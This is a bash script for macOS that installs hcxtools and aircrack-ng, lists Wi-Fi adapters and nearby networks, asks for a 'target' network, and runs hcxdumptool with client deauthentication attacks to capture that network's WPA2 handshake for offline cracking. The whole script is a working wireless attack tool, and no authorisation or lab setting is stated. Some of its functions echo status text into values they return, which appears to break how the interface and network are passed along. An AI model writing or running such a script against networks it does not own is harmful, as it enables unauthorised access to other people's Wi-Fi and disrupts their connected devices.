#!/bin/bash

### 📌 1. INSTALL REQUIRED PACKAGES ###
install_dependencies() {
    echo "[+] Checking dependencies..."

    # Check and install Homebrew
    if ! command -v brew &>/dev/null; then
        echo "[!] Homebrew not found. Installing..."
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    fi

    # Install required tools
    for pkg in hcxtools aircrack-ng; do
        if ! brew list --formula | grep -q "^$pkg$"; then
            echo "[+] Installing $pkg..."
            brew install $pkg
        else
            echo "[✓] $pkg is already installed."
        fi
    done
    
    # Verify hcxdumptool is available in path
    if ! command -v hcxdumptool &>/dev/null; then
        echo "[!] hcxdumptool is installed but not found in PATH"
        echo "[+] Full path to hcxdumptool: $(find /usr/local -name hcxdumptool 2>/dev/null)"
        echo "[!] Please make sure the tools are properly linked."
        exit 1
    fi
}

### 📌 2. DETECT WIFI ADAPTERS ###
detect_wifi_adapters() {
    echo "[+] Detecting Wi-Fi adapters..."

    # Get all network interfaces
    network_info=$(networksetup -listallhardwareports)

    # Parse and format output
    echo -e "\n🔍 Available Wi-Fi Interfaces:"
    echo "-------------------------------------------"

    detected_interfaces=()
    current_port=""
    
    while IFS= read -r line; do
        if [[ $line == "Hardware Port: Wi-Fi"* ]]; then
            current_port=$(echo "$line" | awk -F": " '{print $2}')
        elif [[ $line == "Device:"* ]] && [[ -n $current_port ]]; then
            device=$(echo "$line" | awk -F": " '{print $2}')
            mac=$(ifconfig $device 2>/dev/null | awk '/ether/ {print $2}')
            status=$(ifconfig $device 2>/dev/null | grep -q "status: active" && echo "🟢 Connected" || echo "🔴 Not Connected")
            
            echo -e "🌐 Interface: $device"
            echo -e "🔢 MAC Addr : $mac"
            echo -e "📡 Status   : $status"
            echo "-------------------------------------------"
            
            detected_interfaces+=("$device")
            # Reset for next Wi-Fi adapter
            current_port=""
        fi
    done <<< "$network_info"
    
    # Return the first interface or ask the user to choose
    if [ ${#detected_interfaces[@]} -eq 0 ]; then
        echo "[!] No Wi-Fi interfaces detected!"
        exit 1
    elif [ ${#detected_interfaces[@]} -eq 1 ]; then
        echo "[+] Using the only available interface: ${detected_interfaces[0]}"
        chosen_interface=${detected_interfaces[0]}
    else
        echo "[?] Multiple interfaces detected. Please choose one:"
        select interface in "${detected_interfaces[@]}"; do
            if [ -n "$interface" ]; then
                chosen_interface=$interface
                break
            fi
        done
    fi
    
    echo "[+] Selected interface: $chosen_interface"
    echo
    
    echo $chosen_interface
}

### 📌 3. SCAN WIFI NETWORKS ###
scan_wifi_networks() {
    local iface=$1
    echo "[+] Scanning for Wi-Fi networks (this may take a few seconds)..."
    
    # Path to the airport utility (macOS)
    airport_path="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
    
    if [ ! -f "$airport_path" ]; then
        echo "[!] Airport utility not found at expected location: $airport_path"
        echo "[+] Attempting alternative scanning method..."
        
        # Fallback to system_profiler for network scanning
        echo "[+] Available networks from System Profiler:"
        echo "-------------------------------------------"
        network_info=$(system_profiler SPNetworkDataType | grep -A 20 "Wi-Fi" | grep -E "SSID|Security")
        echo "$network_info"
        echo "-------------------------------------------"
        
        # Check if any networks were found
        if [ -z "$network_info" ]; then
            echo "[!] No Wi-Fi networks found. Please check your Wi-Fi is enabled."
            echo "[!] Aborting script."
            exit 1
        fi
        
        echo "[!] Limited information available with fallback method."
        read -p "[?] Enter target Wi-Fi BSSID: " selected_bssid
        read -p "[?] Enter target Wi-Fi SSID: " selected_ssid
        
        # Return selected network info
        echo "$selected_ssid:$selected_bssid"
        return
    else
        # Header for the network list
        echo -e "\n📡 Available Wi-Fi Networks:"
        echo "----------------------------------------------------------------"
        printf "%-4s %-22s %-18s %-6s %s\n" "No." "SSID" "BSSID" "RSSI" "SECURITY"
        echo "----------------------------------------------------------------"
        
        # Temporary file to store network scan results
        temp_file=$(mktemp)
        
        # Run airport scan and save to temp file to avoid pipe issues
        sudo "$airport_path" -s > "$temp_file"
        
        # Check if scan produced any valid output
        if [ ! -s "$temp_file" ] || [ "$(wc -l < "$temp_file")" -lt 2 ]; then
            echo "[!] No Wi-Fi networks found. Please check your Wi-Fi is enabled."
            rm "$temp_file"
            echo "[!] Aborting script."
            exit 1
        fi
        
        # Use regular arrays instead of associative arrays for compatibility
        ssids=()
        bssids=()
        
        # Skip header line, process and number each network
        counter=1
        found_networks=0
        
        while IFS= read -r line; do
            # Skip output that looks like error or help messages
            if [[ "$line" == *"For"*"Wi-Fi"* || "$line" == *"use the"* ]]; then
                continue
            fi
            
            # Only process non-empty lines with proper format (must contain a MAC address)
            if [[ -n "$line" && "$line" =~ ([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2} ]]; then
                # Extract network information with more reliable parsing
                bssid=$(echo "$line" | grep -o -E '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                
                # Extract SSID (first word before MAC address)
                ssid=$(echo "$line" | awk -v mac="$bssid" '{
                    for (i=1; i<=NF; i++) {
                        if ($i ~ mac) {
                            for (j=1; j<i; j++) {
                                printf "%s ", $j
                            }
                            break
                        }
                    }
                }' | sed 's/ $//')
                
                # Extract RSSI (usually a negative number)
                rssi=$(echo "$line" | grep -o -E '\s+-[0-9]+\s+' | tr -d ' ')
                
                # Extract security (everything after RSSI)
                security=$(echo "$line" | sed -E 's/.*'"$bssid"'[[:space:]]*'"$rssi"'[[:space:]]*//')
                
                # Print formatted output with counter
                printf "%-4s %-22s %-18s %-6s %s\n" "$counter" "$ssid" "$bssid" "$rssi" "$security"
                
                # Store in arrays for later reference (using index for compatibility)
                ssids[$counter]="$ssid"
                bssids[$counter]="$bssid"
                
                counter=$((counter+1))
                found_networks=$((found_networks+1))
            fi
        done < <(tail -n +2 "$temp_file")
        
        # Clean up
        rm "$temp_file"
        
        # Check if any networks were found after parsing
        if [ $found_networks -eq 0 ]; then
            echo "[!] No valid Wi-Fi networks could be parsed from scan results."
            echo "[!] Aborting script."
            exit 1
        fi
        
        echo "----------------------------------------------------------------"
        
        # Get user selection
        read -p "[?] Enter the number of the target network: " network_number
        
        if [[ "$network_number" =~ ^[0-9]+$ ]] && [ "$network_number" -gt 0 ] && [ "$network_number" -lt "$counter" ]; then
            selected_ssid="${ssids[$network_number]}"
            selected_bssid="${bssids[$network_number]}"
            echo "[+] Selected network: $selected_ssid ($selected_bssid)"
        else
            echo "[!] Invalid selection. Please enter a valid network number."
            read -p "[?] Enter target Wi-Fi BSSID: " selected_bssid
            read -p "[?] Enter target Wi-Fi SSID: " selected_ssid
        fi
        
        # Return selected network info
        echo "$selected_ssid:$selected_bssid"
    fi
}

### 📌 4. CAPTURE HANDSHAKE ###
capture_handshake() {
    # Detect WiFi adapters and get chosen interface
    iface=$(detect_wifi_adapters)
    
    # Scan networks and get target info
    network_info=$(scan_wifi_networks "$iface")
    
    # Extract SSID and BSSID
    ssid=$(echo "$network_info" | cut -d':' -f1)
    bssid=$(echo "$network_info" | cut -d':' -f2)
    
    # Validate that we got valid SSID and BSSID
    if [[ -z "$ssid" || -z "$bssid" ]]; then
        echo "[!] Failed to get valid network information."
        echo "[!] Aborting script."
        exit 1
    fi
    
    # Set up monitoring
    echo "[+] Preparing to capture packets for $ssid ($bssid)..."
    
    # Capture handshake with deauth, filtering for a specific SSID
    echo "[+] Capturing WPA2 handshake for $ssid..."
    echo "[+] Running hcxdumptool. Press CTRL+C to stop when a handshake is captured."
    
    # Verify hcxdumptool is in path
    if ! command -v hcxdumptool &>/dev/null; then
        echo "[!] Error: hcxdumptool command not found."
        echo "[!] Please ensure hcxtools is properly installed."
        exit 1
    fi
    
    sudo hcxdumptool -i "$iface" -o "handshake_${ssid}.pcapng" \
        --enable_status=3 \
        --disable_client_attacks=0 \
        --active_beacon \
        --filtermode=2 \
        --filterlist_ap="$bssid" \
        --all_channels

    echo "[✓] Handshake saved as: handshake_${ssid}.pcapng"
}

### 📌 5. RUN THE SCRIPT ###
main() {
    install_dependencies
    capture_handshake
}

main